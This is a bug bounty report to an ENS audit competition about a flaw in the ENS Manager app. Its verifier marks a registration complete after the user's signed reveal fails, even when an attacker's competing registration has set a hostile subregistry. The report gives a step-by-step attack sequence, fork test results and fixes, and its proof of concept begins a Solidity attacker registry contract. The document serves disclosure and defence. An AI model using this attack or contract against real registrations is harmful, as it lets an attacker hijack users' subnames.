# 92778 w a medium manager accepts an attacker controlled subregistry as a completed hca registration after the intended reveal fails

**Submitted on Sep 12th 2026 at 07:49:19 UTC by @IronsideSec for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92778
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

Manager can report a new `.eth` registration as complete while an attacker-selected subregistry controls its descendants. A prepared attacker registers the predicted label directly to the victim with Manager's expected resolver but a hostile subregistry; if it wins the post-construction/pre-fill order, the victim's signed HCA reveal reverts, yet Manager checks only registered status, victim ownership, and resolver address, accepts the attacker's different tuple, and renders `Registration Complete!`. A pinned-fork PoC uses the real Manager builder, an owner-authorized session, deployed Nexus/HCA validation and IntentExecutor, and victim-first same-block fee ordering to prove `NameNotAvailable`, shallow-verifier acceptance, no code at the intended resolver, and attacker-controlled child resolution. Public evidence independently binds an exact signed Warp reveal to its enabled session and a real registrar-level failed fill to production `FAILED` and the installed SDK's `IntentFailedError`. The reproduced post-state is the program's literal Critical impact `6286`: during a Manager registration flow, the registration assigns its descendant registry to the attacker while Manager certifies the victim's reverted zero-subregistry operation as complete.

## Vulnerability Details

### Security invariant and violated postcondition

Manager constructs a registration whose security-relevant tuple includes:

```
(label, victim wallet, victim secret, subregistry = address(0),
 expected deterministic HCA resolver, requested duration, payment token, referrer)
```

After the submitted HCA operation fails, Manager must not certify success merely because some registration now has the same label, visible owner, and visible resolver. It must either bind success to the submitted successful fill/receipt and a `NameRegistered` event emitted by the expected `ETHRegistrar`, or compare every security-relevant postcondition of the intended tuple.

The vulnerable fallback instead accepts this attacker-created tuple:

```
(label, victim wallet, attacker secret, subregistry = attacker contract,
 expected deterministic HCA resolver, attacker-chosen duration, payment token, referrer)
```

The two tuples intentionally agree on the only three facts the verifier uses. They differ on transaction provenance, commitment/secret, subregistry, and potentially duration/expiry.

### The deployed Manager route and frozen public source contain the same weak predicate

The affected route template is `/register/{label}.eth`; at the 2026-09-12 UTC capture, [this live probe](https://manager-app-v4.ens-cf.workers.dev/register/lead042probe.eth) returned the registration application with HTTP `200`. Its [`src-kKZQxHop.js`](https://manager-app-v4.ens-cf.workers.dev/assets/src-kKZQxHop.js) asset was 77,876 bytes with SHA-256 `5d5a8be78bdf7b8cd90d8fcb8811164f8dd98e57095f8ab4a5a4e0ec52320ff7`. The minified asset contains both:

```
waitingForRhinestoneBundle ... onError:{target:`verifyingRegistration`}
```

and a verifier equivalent to:

```
verified = Number(state.status) === REGISTERED
        && state.latestOwner === wallet
        && registryResolver === expectedResolver
```

The public frozen revision resolves to these exact Git trees:

```
1c9b47f18fcddd2e864dfe385c4171061c9811ae:apps/manager                  64736c3d73864f8f82e5a44a657ff24668eaad03
1c9b47f18fcddd2e864dfe385c4171061c9811ae:packages/transaction-manager c3a3c3e2184787ac53063c9054c63d1bd7c433b7
1c9b47f18fcddd2e864dfe385c4171061c9811ae:packages/smart-account       ff6634fe543844a98db38b06f09c213fcc407ff8
```

The unminified source shows the full path:

1. The reveal actor reads the current price, builds the exact reveal calls, starts the transaction, and returns its local transaction ID: [`registration.hca.actors.ts:955-1023`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.hca.actors.ts#L955-L1023).
2. Warp calls `sendTransaction`, obtains an intent, and awaits `waitForExecution`: [`warp-transport.actor.ts:182-226`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/actors/warp-transport.actor.ts#L182-L226).
3. The poller rejects nested states such as `error.submission` and `error.reverted`: [`registration.actors.ts:963-999`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.actors.ts#L963-L999).
4. Every polling error from `waitingForRhinestoneBundle` enters `verifyingRegistration`: [`registration.machine.ts:1225-1240`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.machine.ts#L1225-L1240).
5. If the state-only verifier returns `verified`, the machine moves to `success` and erases the original error: [`registration.machine.ts:1448-1473`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.machine.ts#L1448-L1473).
6. The HCA verifier reads only `getState(id)` and `getResolver(label)`, then compares status, `latestOwner`, and resolver. It never reads `getSubregistry`: [`registration.hca.actors.ts:906-951`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.hca.actors.ts#L906-L951).
7. The mounted success component displays `Registration Complete!` and says the domain is active: [`RegistrationCompletionBanner.tsx:4-20`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/register-v2/workflow/registering/components/RegistrationCompletionBanner.tsx#L4-L20).

This is not a generic “RPC error can look successful” claim. The specific invariant failure is accepting current state created by a different commitment and transaction while omitting the field that delegates the descendant namespace.

### Deployed Sepolia semantics used by the proof

The primary PoC forks Sepolia block `11,685,895` (`0xb25007`), hash `0x2c6e2e8f5dcbfbc960903317b93ed7e02a3b9409c18ad2b05cb7bd5c9ea7fff5`. It calls the frozen Manager source against these deployed contracts:

| Component                       | Address / pinned observation                                                                                                         |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| `ETHRegistrar`                  | `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`; runtime keccak256 `0x7ac653f817e6bef6543d25ce97235b232430b1771ab5bcb27b936798fe38af1f` |
| `PermissionedRegistry`          | `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`; runtime keccak256 `0x99a6ba74173ac220fd9d7a2000a8142cf52d98c7a17ac6abc6d74fa17d8f086c` |
| deployed `IntentExecutor` proxy | `0x00000000005aD9ce1f5035FD62CA96CEf16AdAAF`; runtime keccak256 `0xd23247796c75f502bb7b872631c55da669b2b167d874930f7d98bce2b1d615ba` |
| HCA session validator           | `0x5f249FCa8bB4949105651146858c347E8BFb0F7E`; runtime keccak256 `0x3e7e34311353a7d3d9d6202735d3642b69ded6b49d1dfa4e8fef1efc14e1a364` |
| standalone HCA implementation   | frozen manifest implementation; runtime keccak256 `0x348dc95a362bf23633f8142e54e92dea48091d108d24c323bea50794c89351fd`               |
| `MockUSDC`                      | `0x768F42455A2D082E23ceeF7d51e5787C82d67a39`                                                                                         |
| `StandaloneHCAFactory`          | `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef`                                                                                         |
| Universal Resolver              | `0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe`                                                                                         |
| commitment validity             | minimum `60` seconds; maximum `86,400` seconds                                                                                       |
| minimum registration duration   | `2,419,200` seconds (28 days)                                                                                                        |

Direct `eth_getCode` at the pinned block, followed by keccak256 of the returned bytes, produces the runtime hashes. `ETH_REGISTRY()` on the registrar returns the listed registry. The clean-checkout PoC also checks that the account ID is `ens-standalone-hca.1.1.0`, the deployed executor is installed, the owner-authorized permission is enabled, and the first session nonce is consumed before it tests the reveal.

### Attack sequence

1. The attacker chooses a target label and wallet. The standalone HCA address and expected resolver are deterministic from the wallet and public manifests.
2. At least 60 seconds before the attack, the attacker submits its own commitment for `(label, victim, attacker secret, attacker registry, expected resolver, duration, referrer)`. It is eligible while its age is in `[60, 86,400)` seconds. This requires advance knowledge of both label and victim wallet; this report does not claim reactive unknown-label front-running.
3. The victim uses the ordinary `/register/{label}.eth` HCA flow and matures its distinct zero-subregistry commitment.
4. The real Manager `submitRevealBatchActor` reads live availability and price and builds its five destination calls: deterministic resolver deployment, registrar approval, zero-subregistry `register`, and resolver text/address configuration.
5. The victim session signs those calls plus the refund approval inside mode-`0x02` execution. The outer transaction targets deployed `IntentExecutor.executeSinglechainOpsWithGasRefund_ERC20` (`0xf9225e8b`); deployed Nexus/HCA validation checks the owner-authorized enabled permission.
6. During the remaining handoff/inclusion interval, the attacker sends the ordinary direct registrar transaction. In the deterministic fee-order proof, the already-signed victim transaction is enqueued first. The hostile transaction is enqueued later with a higher tip. Anvil's explicit fee ordering mines the attacker at index `0` and the victim at index `1` in the same block.
7. The hostile registration mints directly from zero to the victim with the expected resolver and a nonzero hostile subregistry. The victim session reaches the registrar's `register` call and reverts with `0x477707e8 = NameNotAvailable(label)`; the atomic revert also rolls back resolver deployment/configuration and the intent nonce.
8. The production orchestrator returns `FAILED` for a real public IntentExecutor fill that terminated at the registrar. The installed competition-pinned `@rhinestone/sdk` polls that production record directly and constructs its genuine `IntentFailedError`. A separate mounted frozen-Manager test uses the same `FAILED` wire shape to prove Warp wraps it as `TransactionSubmissionError`, the nested poll rejects, and the unchanged `waitingForRhinestoneBundle.onError -> verifyingRegistration` branch runs.
9. The attacker's state is `REGISTERED`, names the victim as `latestOwner`, and stores the expected resolver, so the incomplete verifier returns `{ verified: true }` without reading the hostile subregistry, receipt, event, or resolver code. Manager clears the failure and renders `Registration Complete!` with no hostile-registry warning.
10. Universal Resolver follows the hostile subregistry for descendants and resolves `pay.<label>.eth` to the attacker.

The local ordering result is deterministic evidence that a builder can choose this order; production inclusion remains probabilistic. If the hostile registration lands before Manager's final availability/price construction, Manager fails before submission. If it lands after the victim fill, it loses. Commitment maturity makes the attacker eligible; it does not guarantee this final inclusion win.

### Exact post-state and differential

The primary session proof produces this post-state after the same-block contest:

| Field                     | Clean signed-session control | Hostile-first signed-session result                                            |
| ------------------------- | ---------------------------- | ------------------------------------------------------------------------------ |
| victim outer transaction  | succeeds                     | reverts                                                                        |
| inner registrar result    | succeeds                     | `NameNotAvailable("lead042-session-bundle-proof")`                             |
| registry status           | `REGISTERED`                 | `REGISTERED`                                                                   |
| `latestOwner`             | victim `0xCB49…4C79`         | victim `0xCB49…4C79`                                                           |
| resolver address          | expected `0x3f89…993B`       | expected `0x3f89…993B`                                                         |
| code at expected resolver | deployed/configured          | none; victim batch rolled back                                                 |
| subregistry               | `0x0000…0000`                | attacker registry `0x7925…2415`                                                |
| failed session nonce      | not applicable               | unconsumed after rollback                                                      |
| Manager verifier          | valid clean result           | `{ verified: true }`                                                           |
| child resolution          | intended resolver            | `pay.lead042-session-bundle-proof.eth -> 0xCa74…b1b` through attacker registry |

The ordered block is `11,685,904`. Hostile transaction `0x589e39e2aa21237b3f1ad1efae3086cf26567e47630430e74ed7795a62d38ce3` is index `0`/success; victim session transaction `0x324523c2d8c1d5a26cee8ddecb9ff75c28c94c45c7a9d9d2999b8d4c18a8abf9` is index `1`/reverted. `debug_traceTransaction` records `IntentExecutor (0xf9225e8b) -> HCA (0xd691c964) -> ETHRegistrar.register (0xcff3e7c2)` and the same `0x477707e8` return data at each failing level.

A supplementary mounted-state-machine proof uses a different deterministic victim and label to assert the fields omitted above: the registry mints from `address(0)` directly to the victim; victim roles equal the clean control; coordinator, helper, and attacker roles are all zero; no transfer or retained delegate is used; the installed SDK `FAILED` mapping rejects polling; and the mounted UI still reaches `success` and displays `Registration Complete!` with no subregistry/coordinator warning. It also proves the recovery described below. The clean control uses the same label and five Manager calls, succeeds, leaves subregistry zero, deploys the resolver, and resolves the parent to the victim.

### Public Sepolia ordering observation and its boundary

Three independent observations bridge the local proof to live Warp/session behavior without any shared-network write.

**1. Exact signed public reveal replay.** Public Sepolia reveal transaction [`0xb38b…7879`](https://sepolia.etherscan.io/tx/0xb38b2391a7cb18bd597591f1f69c259ef3b7397b2ffc3660a6103a526a587879) contains `4,474` signed bytes (SHA-256 `a557860af07ec18cf99076d1691f5c1cae0d9f681799842955f5636d72e28ea6`). It was sent by relayer `0x4656…A28e` to deployed IntentExecutor for HCA `0xd637…58e3`. On the block-`11,682,690` fork, the HCA reports owner `0xBa70…0eFb` and deployed validator `0x5f24…F0F7E` reports permission ID `0x5963…6802` enabled. The unmodified raw transaction succeeds cleanly. After snapshot rollback, the same raw victim transaction enters the local pool first; a later hostile registration with priority fee `2,000,000` versus the victim's `1,000,000` is ordered first. Both mine in local block `11,682,696`: hostile index `0` succeeds, identical victim bytes at index `1` revert with `NameNotAvailable("hydroxamino")`. This proves the exact enabled-session/executor consequence. The public transaction's Manager-app provenance is not independently established.

**2. A real live terminal session fill and production status.** Public Sepolia block `11,676,970` contains two adjacent fills from the same production relayer to the same deployed IntentExecutor and HCA. Transaction [`0xce4b…961d`](https://sepolia.etherscan.io/tx/0xce4b8331001976d672d02571f6d7846f847d09f7a2791c5aecebfc845da2961d), index `59`, succeeds. Transaction [`0xd7a9…1975`](https://sepolia.etherscan.io/tx/0xd7a9daa6020a11339028718eb666637310ea0ca836f7696f901504c2d0841975), index `60`, fails. Their session operation payloads are byte-identical (`2,146` bytes; SHA-256 `b1de88c2a81b6fd22579371f89ba0db32580c145fa000a24390e18928d38197b`) and both reach the registrar. Exact raw-byte replay on a block-`11,676,969` fork reproduces success then failure; the second decodes as `CommitmentTooOld` because the first consumed their shared commitment. Safe read-only GETs to the production SDK endpoint return HTTP `200` `COMPLETED` for public intent ID `4432482692933462003096786349150090565382649868015225675926211776048920053`, with fill hash `0xce4b…961d`, and HTTP `200` `FAILED` for public intent ID `42127326821927834843457600193509318702580032922730753082388002319588016`. Exact response-body SHA-256 values are `5153aa439d336981d5040f448f77fa567a996cd76e13c397c74342f5538c0522` and `183b9b989c15c721d286276cfb3dadc40bea5304f4b56926de640f670d7a800d`; the captured one-line bodies are:

```json
{"status":"COMPLETED","claims":[],"destinationChainId":11155111,"fillTimestamp":1789068420,"fillTransactionHash":"0xce4b8331001976d672d02571f6d7846f847d09f7a2791c5aecebfc845da2961d","userAddress":"0x44bfbea6996c0d003fd1474c881e3a4f9f0eaf68"}
{"status":"FAILED","claims":[],"destinationChainId":11155111,"userAddress":"0x44bfbea6996c0d003fd1474c881e3a4f9f0eaf68"}
```

The requests used Manager's normal public browser client credential without printing or persisting it. This is not the hostile attack and not `NameNotAvailable`; it independently proves a real production-relayed session/executor registrar failure and its real `FAILED` status boundary.

**3. Public pre-inclusion visibility.** A passive `eth_subscribe(newPendingTransactions)` observer sent no transaction and received the same signed HCA registration pair from independent dRPC and PublicNode peers while immediate reads still returned `blockNumber: null`. The label-bearing reveal `0xa46e…80d5` was first observed `12.723 s` before its eventual block timestamp. This establishes at least one publicly propagated label-bearing Warp-shaped reveal, but does not prove Manager provenance, universal propagation, or a later transaction winning.

Together, these facts show real signed HCA sessions, deployed IntentExecutor fills, public pre-inclusion visibility, a real on-chain terminal fill with production `FAILED` status, and the exact hostile-order consequence. They do **not** prove a hosted hostile `NameNotAvailable` fill, that every fill enters a public mempool, or a real-world success rate. The local hostile receipt adapter remains clearly local; the production `FAILED` body belongs to the separately identified public `CommitmentTooOld` fill. No credential was bypassed or disclosed, and no completed live exploit is claimed.

### What the PoC models, and what it does not

The report separates four boundaries instead of claiming one synthetic run is the hosted production system:

| Boundary                                                     | Evidence                                                                                                            | Result and limitation                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| ------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Manager construction + deployed session execution + ordering | Primary clean-checkout `bundle-session-e2e`                                                                         | Real `submitRevealBatchActor` reads availability/price and creates the exact five calls; real owner authorization enables a session; deployed validator, HCA, refund-aware IntentExecutor, registrar, registry, factory, token, and Universal Resolver execute them. Victim is submitted first, attacker second/higher-tip, then fee-ordered hostile-first. Hosted SDK handoff is deliberately replaced by a local signed envelope.                                         |
| Exact live signed bytes                                      | `live-signed-replay.test.ts`                                                                                        | Replays an unmodified public relayer transaction through its real enabled HCA session, clean then hostile-first. This is a deterministic local fork, and Manager provenance is not claimed.                                                                                                                                                                                                                                                                                 |
| SDK and Manager failure handling                             | production public-fill status, installed SDK, receipt-backed adapter, and mounted `lead042-self-contained.test.tsx` | The real endpoint returns `FAILED` for an identified public failed fill, and the installed `waitForExecution` directly polls it and throws `IntentFailedError`. The mounted test uses the same status shape; real Warp transport wraps it, nested polling rejects, and unchanged verifier/machine/UI accepts the hostile state. IDs/local responses in that mounted test remain fabricated and clearly labeled; the remote body is attributed only to the real public fill. |
| Live reachability                                            | public raw transactions, production read-only statuses, and passive reads                                           | Proves production relayer/IntentExecutor/session fills, an on-chain terminal registrar failure with production `FAILED`, and at least one pre-inclusion label-bearing reveal. It does not prove hostile live ordering or builder frequency.                                                                                                                                                                                                                                 |

The primary proof no longer uses `executeByOwner` for the victim operation. It uses a deployed `ens-standalone-hca.1.1.0`, a real owner-authorized permission, session-key signature, Nexus ERC-1271 validation, gas-refund policy, and deployed `IntentExecutor`. The exact signed-live proof independently reaches the same executor and enabled session. The mounted UI supplement retains an owner-route on-chain consequence control only to keep its DOM/state-machine fixture compact; it is not the evidence for session reachability or ordering.

All harmful writes occur only on private forks. The PoCs use test-only balances/tokens, local snapshots, time advancement, and deliberate local mining policy. They do not use victim accounts, shared-network hostile commitments, a hosted submission method, or a shared-network attack transaction. The sole production-service calls are normal browser-client GETs for already-public intent IDs. The result proves technical exploitability and builder-order feasibility, not guaranteed or measured production success.

### Recovery and user-visible warning

The informed victim keeps the normal full registry bitmap and can remove attacker control with one authorized call:

```solidity
PermissionedRegistry.setSubregistry(labelId, address(0));
```

That first transaction makes Universal Resolver stop selecting the hostile registry, and the zero-role attacker cannot restore the pointer. It does **not** fully restore the intended registration: because the victim reveal reverted atomically, the deterministic resolver address still has no code. The supplementary fork proof restores the intended working state in a second victim-authorized HCA transaction that executes the original resolver deployment/configuration calls, then confirms resolver code exists and Universal Resolver resolves the parent address to the victim.

The report therefore does not claim permanent bricking, parent theft, or unavailable recovery. The Critical program wording expressly includes assigning the registration's registry to an attacker during a Manager flow. Manager declares completion without reading, showing, or warning about that attacker registry or the undeployed resolver. Its registration flow gives the victim no diagnostic that either repair is needed.

### Recommended fix

1. Treat a known terminal HCA submission, fill, or receipt failure as failure. Do not route it to a generic state-only success check.
2. Reserve recovery verification for genuinely ambiguous observation failures such as an RPC timeout where transaction outcome is unknown.
3. Bind any recovery success to the submitted intent/fill/transaction and a successful intended `NameRegistered` event emitted by the expected `ETHRegistrar`.
4. Also compare the complete intended post-state, including zero/expected subregistry, expected owner, expected resolver, deployed/configured resolver code, intended duration/expiry, and clean expected authority.
5. Preserve and display the nested failure instead of clearing it when only a lookalike state exists.
6. Add a regression where another commitment registers the same label to the expected owner/resolver but a hostile subregistry; the verifier must reject it.

### Public-overlap fence

The current recursive census of `audit_workspace/reports` contains all `26` Markdown/PDF artifacts (`15` Markdown and `11` PDF), including evidence READMEs and the current report. Every available prior submitted/confirmed report family was reviewed: `#90254`, `#90446`, `#92510`, `#92535`, controlling reopened `#92552`, and submitted/escalated `LEAD-044`, plus the remaining local reports and research. No same causal root and reciprocal complete fix were found.

| Comparator                                    | Why it is not a reciprocal complete-fix duplicate                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| --------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `#90254` stale V1 migration authority         | Refreshing migration authority does not bind a failed HCA reveal to its receipt/full tuple; 042's provenance fix does not refresh migration state.                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `#90446` partial backend fanout               | Delivery/idempotency is a different asset, sink, and fix.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| `#92510` raw-NFD authorization/NFC transfer   | Unicode resource normalization does not fix failed-registration provenance; provenance binding does not normalize identifiers.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `#92535` positional stale role grant          | Stable row identity/reset does not affect HCA registration; receipt/full-tuple binding does not repair Portal row state.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `#92552` aggregate resolver-role under-revoke | Resource-keyed role projection/revoke is independent of registration provenance.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| submitted/escalated `LEAD-044`                | Portal treats a genuine `UserRegistry` as a resolver and applies the wrong role vocabulary. Its complete fix positively binds contract class before role administration; that does not bind a Manager reveal to its successful receipt/full tuple. Manager provenance binding does not type-check Portal role targets.                                                                                                                                                                                                                                                                                                 |
| `WEB-1148`                                    | Discloses simultaneous same-name registration causing the loser an endless commit loop until refresh. It does not disclose unrelated-current-state substitution or an attacker-selected subregistry. A loop/reset repair need not bind the submitted fill/receipt/full tuple; Manager's HCA provenance repair need not fix every collision loop. Even if triage groups the broad collision root, the program expressly keeps in scope “new consequences of a listed root cause that materially change its severity” and says a demonstrated security consequence of a functional issue goes beyond the known breakage. |
| issue `#418` / PR `#428`                      | Concerns roles/pointers surviving transfer. Primary 042 has no transfer, retained delegate, or attacker role.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |

[`ensdomains/contracts-v2#443`](https://github.com/ensdomains/contracts-v2/pull/443) is the most adverse public art. It added `subregistry == address(0)` to the HCA **session validator** and therefore identifies the same dangerous field/outcome. It does not fix this route: the attacker uses an ordinary direct registrar call, not the victim's session authorization; the victim session is zero-subregistry and valid, then loses to the unrelated registration; Manager subsequently accepts that unrelated state. Conversely, making Manager fail closed or bind its successful receipt/event/full tuple does not prevent a successfully executed authorized session that itself contains a nonzero subregistry. The roots and complete fixes remain distinct, but grouping/prior-notice risk is material and is not hidden.

This is a bounded novelty result: **no earlier independent match was found among the reviewed prior report families or in successful public searches**. The census necessarily includes the canonical LEAD-042 copy; that self-match is not prior art. This does not exclude an unseen private primary or guarantee program adjudication.

## Impact Details

The selected program impact states:

> **Impact ID `6286`:** “Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker.”

The reproduced post-state is the wording's literal example. During the Manager registration flow, the on-chain registration assigns its descendant registry (`subregistry`) to the attacker, while Manager certifies the victim's different zero-subregistry operation as complete. Universal Resolver immediately delegates `pay.<label>.eth` to that attacker registry, which returns the attacker's resolver/address. The deterministic session proof also shows the expected resolver has no code because the victim operation reverted atomically.

The impact does not rely on stealing an existing parent token, retaining parent-registry permissions, or tricking the victim into granting a role. The hostile registration mints the parent directly to the victim. The victim owns the parent and normal roles; attacker/helper roles are zero. The attacker controls descendants only through the on-chain registry pointer that Manager neither checks nor warns about.

This is targeted and recoverable. The attacker must know `(label, victim wallet)` early enough to mature a commitment and must win a narrow post-construction/pre-fill ordering interval. The victim can clear the hostile pointer in one transaction; full restoration of the rolled-back resolver takes the second transaction demonstrated by the proof. No parent-name theft, permanent lock, victim rent debit, or guaranteed inclusion win is claimed. Those limits affect likelihood and recovery, but they do not change the reproduced Critical `6286` assignment of a registration's registry to an attacker during an in-scope Manager flow.

## References

* [ENS competition assets and impacts in scope](https://immunefi.com/audit-competition/audit-competition-ens/scope/) (impact ID `6286`)
* [ENS competition known-issues and new-security-consequence rule](https://immunefi.com/audit-competition/audit-competition-ens/information/)
* [Frozen Manager application tree](https://github.com/immunefi-team/audit-comp-ens/tree/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager)
* [Manager HCA reveal builder and transaction start](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.hca.actors.ts#L955-L1023)
* [Manager HCA state-only verifier](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.hca.actors.ts#L906-L951)
* [Polling error enters `verifyingRegistration`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.machine.ts#L1225-L1240)
* [Truthy fallback erases the error and enters success](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.machine.ts#L1448-L1473)
* [Nested transaction error detection](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.actors.ts#L963-L999)
* [Warp intent submission and `waitForExecution`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/actors/warp-transport.actor.ts#L182-L226)
* [Pinned upstream SDK `waitForExecution` implementation](https://unpkg.com/@rhinestone/sdk@1.8.0/dist/src/execution/index.js)
* [Mounted success banner](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/register-v2/workflow/registering/components/RegistrationCompletionBanner.tsx#L4-L20)
* [Live Manager registration route](https://manager-app-v4.ens-cf.workers.dev/register/lead042probe.eth)
* [Captured live Manager source bundle](https://manager-app-v4.ens-cf.workers.dev/assets/src-kKZQxHop.js)
* [Public Manager smart-account/SDK bundle containing its browser client configuration](https://manager-app-v4.ens-cf.workers.dev/assets/SmartAccountContext-DfEj7XXX.js)
* [Sepolia `ETHRegistrar`](https://sepolia.etherscan.io/address/0xa88553F454b77203B0D036A05c894d555EAAa2Cc)
* [Sepolia `PermissionedRegistry`](https://sepolia.etherscan.io/address/0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2)
* [Exact public signed reveal replayed by the PoC](https://sepolia.etherscan.io/tx/0xb38b2391a7cb18bd597591f1f69c259ef3b7397b2ffc3660a6103a526a587879)
* [Public live successful IntentExecutor fill](https://eth-sepolia.blockscout.com/tx/0xce4b8331001976d672d02571f6d7846f847d09f7a2791c5aecebfc845da2961d)
* [Adjacent public live failed IntentExecutor fill](https://eth-sepolia.blockscout.com/tx/0xd7a9daa6020a11339028718eb666637310ea0ca836f7696f901504c2d0841975)
* [Observed public label-bearing reveal fill](https://sepolia.etherscan.io/tx/0xa46e6e72150c986b601ca87f5f3f9f40e492ec118ade2dc3c6f60d6efd6f80d5)
* [Public same-field/different-root prior art: contracts-v2 PR #443](https://github.com/ensdomains/contracts-v2/pull/443)

## Link to Proof of Concept

<https://gist.github.com/IronsideSec/61e4683879e240c156555ef952e723e3>

## Proof of Concept

## Proof of Concept

### Safety and evidence boundaries

Every harmful write below stays on a loopback-only Anvil fork. The commands use public reads from Sepolia archive state and public transaction bytes. The only hosted-orchestrator operation is an ordinary read-only `GET` for two public intent IDs using Manager's browser-public client configuration; no credential is printed and no `POST` is sent. Do **not** replace `ANVIL_RPC` with shared Sepolia and do not submit the hostile transaction through a hosted orchestrator. Test-only private keys and the displayed mnemonic hold no production funds.

The primary test proves Manager construction, a genuine owner-authorized session, deployed Nexus/HCA and IntentExecutor execution, deterministic same-block fee ordering, the exact inner revert, verifier acceptance, and hostile descendant resolution. The second test replays an unmodified signed public transaction through its enabled live session. The third mounts the real Manager state machine/UI and installed SDK `FAILED` mapping. The final control binds a genuine on-chain failed fill to the production `FAILED` response. This split is deliberate: it does not attribute the public `CommitmentTooOld` response to the local hostile `NameNotAvailable` transaction or claim a local miner is a production builder.

### 1. Checkout and install the frozen public revision

```sh
git clone https://github.com/immunefi-team/audit-comp-ens.git
cd audit-comp-ens
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
corepack pnpm install --frozen-lockfile

git rev-parse HEAD
git rev-parse HEAD:apps/manager
git rev-parse HEAD:packages/transaction-manager
git rev-parse HEAD:packages/smart-account
```

Expected:

```
1c9b47f18fcddd2e864dfe385c4171061c9811ae
64736c3d73864f8f82e5a44a657ff24668eaad03
c3a3c3e2184787ac53063c9054c63d1bd7c433b7
ff6634fe543844a98db38b06f09c213fcc407ff8
```

Foundry/Anvil `1.5.1-stable`, Node `v22.19.0`, and Vitest `4.1.5` produced the recorded clean run. Any Sepolia archive RPC can replace the public Tenderly endpoint.

### 2. Primary Manager-built session and same-block ordering proof

Create this directory:

```sh
mkdir -p audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e/src
```

Save the next block as `audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e/src/HostileRegistry.sol` (SHA-256 `0cdf15095dfe1986df241d1f923245ae3fd957103fccb700a3db2532195bfd9b`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/// Minimal hostile ENSv2 child registry and resolver used only on the local fork.
/// The parent registration points at this contract as its subregistry. Every child
/// is then owned by `controller` and resolves to that same address.
contract HostileRegistry {
    address public immutable CONTROLLER;
    address public immutable PARENT;
    string private parentLabel;

    constructor(address controller_, address parent_, string memory parentLabel_) {
        CONTROLLER = controller_;
        PARENT = parent_;
        parentLabel = parentLabel_;
    }

    function supportsInterface(bytes4 id) external pure returns (bool) {
        return id == 0x01ffc9a7 || id == 0x51f67f40 || id == 0x63560a8e;
    }

    function supportsFeature(bytes4) external pure returns (bool) {
        return true;
    }

    function findOwner(string calldata) external view returns (address) {
        return CONTROLLER;
    }

    function getResolver(string calldata) external view returns (address) {
        return address(this);
    }

    function getSubregistry(string calldata) external pure returns (address) {
        return address(0);
    }

    function getParent() external view returns (address, string memory) {
        return (PARENT, parentLabel);
    }

